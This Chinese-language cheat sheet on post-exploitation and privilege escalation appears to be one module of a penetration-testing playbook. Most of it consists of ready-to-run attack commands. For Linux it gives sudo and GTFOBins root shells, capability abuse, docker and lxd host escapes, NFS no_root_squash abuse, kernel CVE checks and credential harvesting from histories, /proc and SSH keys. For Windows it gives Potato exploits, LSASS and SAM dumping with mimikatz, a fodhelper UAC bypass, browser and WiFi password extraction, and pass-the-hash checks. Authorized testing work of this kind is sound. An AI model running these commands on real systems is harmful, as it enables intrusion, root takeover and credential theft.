# 后渗透与提权

> 适用：通过 RCE/webshell/SSH/RDP 拿到 Linux 或 Windows 立足点后，30 分钟内判定"能不能提权、有没有可复用凭据"。

## 认什么

- **身份句**：`id`、`whoami /all`、`sudo -l`、`whoami /priv` 四件套结果决定整条路线。
- **秒提信号**：Linux 有 `NOPASSWD` 条目、非标准 SUID（不是 ping/su/sudo/mount 那批）、`/etc/passwd` 可写；Windows 有 `SeImpersonatePrivilege`、在 Administrators 组但被 UAC 限制、服务二进制可写。
- **横向线索**：双网卡、`/etc/resolv.conf` 或 `ipconfig /all` 的 DNS 指向内网 IP、`arp -a` 表大、`~/.ssh/known_hosts` 有内网主机。
- **容器/云嫌疑**：`/.dockerenv`、cgroup 含 docker/kubepods、环境变量出现云厂商前缀 → 先按云主机思路查元数据。
- **凭据面**：Web 配置、`.bash_history`/`.mysql_history`、SSH 私钥、`/proc/*/environ`、浏览器配置、SAM/LSASS、cmdkey、PSReadLine 历史。

## 打哪（命令）

### Linux：先 30 秒，再按决策树

```bash
id && sudo -l 2>/dev/null                          # 80% 的提权从这里开始
find / -perm -4000 -type f 2>/dev/null | head -20   # SUID
getcap -r / 2>/dev/null                             # Capabilities
ls -la /etc/passwd /etc/shadow 2>/dev/null          # 可写/可读
uname -a && cat /etc/os-release                     # 内核与发行版
ip addr && ip route && ss -tlnp && cat /etc/resolv.conf
ps aux && env | grep -iE 'pass|key|secret|token'
```

按成功率排队：sudo 滥用 → SUID/SGID → Capabilities → Cron → 可写文件/服务 → 特殊组 → NFS → 内核漏洞（最后，有崩溃风险）。

```bash
# sudo + GTFOBins（示例，完整表查 gtfobins.github.io）
sudo vim -c '!bash'
sudo find / -exec /bin/bash -p \; -quit
sudo python3 -c 'import os; os.execl("/bin/bash","bash","-p")'
sudo awk 'BEGIN {system("/bin/bash")}'
sudo tar cf /dev/null x --checkpoint=1 --checkpoint-action=exec=/bin/bash
sudo env /bin/bash
# 保留 LD_PRELOAD 时：编译 .so，_init 里 setuid(0)+system("/bin/bash -p")
# CVE-2019-14287（sudo<1.8.28 且规则 (ALL,!root)）：sudo -u#-1 /bin/bash
# CVE-2021-3156 Baron Samedit（1.8.2-1.8.31p2 / 1.9.0-1.9.5p1）

# SUID / Capabilities / Cron
find / -perm -4000 -type f 2>/dev/null | grep -v -E '/(ping|su|sudo|passwd|mount|umount|pkexec|crontab)$'
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'   # cap_setuid
tar czf /tmp/s.tgz /etc/shadow                                  # cap_dac_read_search
cat /etc/crontab && ls -la /etc/cron.d/
# root cron 跑可写脚本 → 替换内容；cron 通配符（tar *）→ --checkpoint-action 参数注入

# 特殊组
docker run -v /:/hostroot -it alpine chroot /hostroot bash      # docker 组
lxc init myimage c -c security.privileged=true                  # lxd 组 + security.privileged
lxc config device add c d disk source=/ path=/mnt/root recursive=true && lxc start c
debugfs /dev/sda1                                               # disk 组，cat /etc/shadow

# NFS no_root_squash：攻击机 root 挂载 → cp /bin/bash + chmod +s → 目标执行 -p
showmount -e TARGET_IP && mount -t nfs TARGET_IP:/SHARE /tmp/nfs

# 内核漏洞（先对版本再跑）
uname -r   # PwnKit CVE-2021-4034 所有 pkexec / DirtyPipe CVE-2022-0847 5.8-5.16
           # DirtyCow CVE-2016-5195 2.6.22-4.8 / OverlayFS CVE-2021-3493、CVE-2023-0386
```

凭据收集（提到 root 也做）：

```bash
cat /var/www/html/config.php /var/www/html/.env 2>/dev/null
grep -rli "password" /var/www/ /opt/ /etc/ 2>/dev/null | head -20
cat ~/.bash_history ~/.mysql_history ~/.python_history 2>/dev/null | grep -iE 'pass|pwd|mysql.*-p'
cat ~/.ssh/id_rsa; ls -la /home/*/.ssh/; cat ~/.ssh/known_hosts
cat /etc/mysql/debian.cnf ~/.my.cnf ~/.pgpass 2>/dev/null
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'pass|key|secret|token'
cat /proc/*/cmdline 2>/dev/null | tr '\0' ' ' | grep -iE 'pass|pwd'
```

### Windows：权限表决定路线

```cmd
whoami /all                 :: 用户、组、SeImpersonate/SeBackup/SeDebug
systeminfo                  :: 版本、补丁、Domain 是否 WORKGROUP
ipconfig /all               :: DNS = 域控 IP
wmic service get name,pathname | findstr /i /v "C:\Windows" | findstr " "   :: 未加引号路径
sc qc SERVICE && icacls "C:\path\svc.exe"    :: 可写服务二进制
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"      :: AutoAdminLogon
```

| 权限/状态 | 路线 |
|---|---|
| SeImpersonatePrivilege | Potato：不确定版本用 `GodPotato.exe -cmd "cmd /c whoami"`；2016/2019 用 `PrintSpoofer.exe -c`；旧版 `JuicyPotato.exe`；`SweetPotato.exe`、`RoguePotato.exe` |
| SeBackupPrivilege | `reg save HKLM\SAM` / `HKLM\SYSTEM` 后离线 secretsdump |
| SeDebugPrivilege | dump LSASS：`mimikatz "privilege::debug" "sekurlsa::logonpasswords"` 或 `rundll32 comsvcs.dll MiniDump <lsass pid> C:\temp\lsass.dmp full` |
| Administrators + UAC | `fodhelper.exe` 改 `HKCU\Software\Classes\ms-settings\Shell\Open\command` 后执行；或 `eventvwr.exe`、CMSTP |
| 服务配置/目录可写 | 替换二进制或 `sc config binpath=`，重启服务 |
| AlwaysInstallElevated=1 | MSI 以 SYSTEM 安装 |
| 补丁缺失 | CVE-2021-1732、CVE-2021-36934（HiveNightmare）、PrintNightmare CVE-2021-34527 |

凭据提取三入口：SAM（`reg save` 两库 + secretsdump）、LSASS（Mimikatz / comsvcs dump）、其他（Chrome `Login Data`、Firefox `logins.json`、`cmdkey /list`、`findstr /si "password" *.xml *.ini *.txt *.config`、PSReadLine `ConsoleHost_history.txt`、`netsh wlan show profile name="X" key=clear`）。

自动化兜底：`linpeas.sh`（Linux 最全）、`linenum.sh -t`、`linux-exploit-suggester.sh`；Windows `winPEASx64.exe`、`PowerUp.ps1` + `Invoke-AllChecks`、`Seatbelt.exe -group=all`。工具投递见 `internal-10`。

## 什么算成

- 真拿到高权限并**在新上下文验证**：Linux `id` 回 `uid=0`；Windows `whoami` 回 `nt authority\system` 或 `domain\administrator`，且能读此前读不到的文件/注册表。
- 拿到可复用凭据并**验证过一次**：明文账号经 `netexec`/`ssh` 登录成功，或 NTLM hash 直接 PTH 成功（`netexec smb ... -H` 回 Pwn3d），或 SSH 私钥能登另一台。
- 域判断有结论：`systeminfo`/`DNS` 证明在域内，并已列出域控、域用户、域管组；或明确否定（WORKGROUP）并记入线索板。
- 提权失败也要交：试过哪些向量、被什么拦（sudo 受限/容器无 SUID/EDR 拦 LSASS）、下一步建议。

## 假点

- `sudo -l` 有 NOPASSWD，但目标程序被 wrapper/参数白名单锁死，GTFOBins 那条打不通。
- SUID 命中的都是标准系统程序，`strings` 看完没有可劫持点；版本对得上，但发行版打了回填补丁。
- 内核 CVE 版本对，跑起来无效果：容器内（无 /proc 权限、内核是宿主）或补丁回填。
- LSASS dump 被 PPL/Credential Guard/EDR 拦；SAM 里只有空密码或已禁用本地账户。
- 只读到 `/etc/shadow` 或 `config.php` 里疑似密码，没验证能登录，就写成"拿到凭据"。
- 域 hash 拿到了，但目标域已禁 NTLM 或账号被保护组标记，登录失败。
- 提权链依赖的写权限其实是"同组可写但目录有 sticky bit"；或改完服务没重启就当成功。

## 与其他包联动

- 提权后收凭据 → `internal-04`（凭据/中继/投毒）、`internal-05`（PTH/票据横向）。
- 域环境判断成立 → `internal-01`/`internal-02`/`internal-03`（侦察、Kerberos、委派/ACL/ADCS）。
- 需要跨网段 → `internal-06`；要往目标落 linpeas/winPEAS → `internal-10`。
- 提权用的 CVE/PoC 先查 `../../../../kb/`（`../../../../rules/55-kb-usage.md`）；改服务/写盘遵循 `../../../../rules/20-min-harm.md`，证据按 `../../../../rules/40-evidence-report.md`。
